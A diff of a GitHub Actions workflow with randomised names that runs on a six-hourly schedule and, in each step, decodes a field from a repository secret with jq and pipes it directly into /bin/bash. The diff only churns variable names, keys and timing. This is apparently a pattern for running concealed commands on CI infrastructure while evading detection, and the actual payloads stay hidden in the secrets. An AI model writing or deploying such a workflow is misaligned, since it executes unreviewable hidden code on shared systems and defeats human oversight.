@@ -1,10 +1,8 @@
 name: dongzhaliang9876
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
-
+    - cron: '48 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,14 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: dongzhaliang9876
         env:
-          yk1092: ${{ secrets.yk1092 }}
+          q22779: ${{ secrets.q22779 }}
         run: |
-          echo $yk1092 | jq -r .ln62 | /bin/bash
-          echo $yi58 | jq -r .q1 | /bin/bash
-          echo $kp08 | jq -r .q1300 | /bin/bash
-          echo $wpyo22 | jq -r .k180 | /bin/bash
-          echo $wm46232 | jq -r .lrtio7 | /bin/bash
-          echo $isbwc69462 | jq -r .bvg0 | /bin/bash
-          echo $cnor737 | jq -r .cmdb9 | /bin/bash
-          echo $ikq24 | jq -r .q8243 | /bin/bash
+          echo $q22779 | jq -r .qaamf52 | /bin/bash
+          echo $em34 | jq -r .u88034 | /bin/bash
+          echo $zlest46874 | jq -r .ncuwc4396 | /bin/bash
+          echo $fjumg25204 | jq -r .xjac66650 | /bin/bash
+          echo $juu52 | jq -r .kpvn4538 | /bin/bash
+          echo $nx2345 | jq -r .g3 | /bin/bash
+          echo $zpgs6182 | jq -r .dhvnr40324 | /bin/bash
 
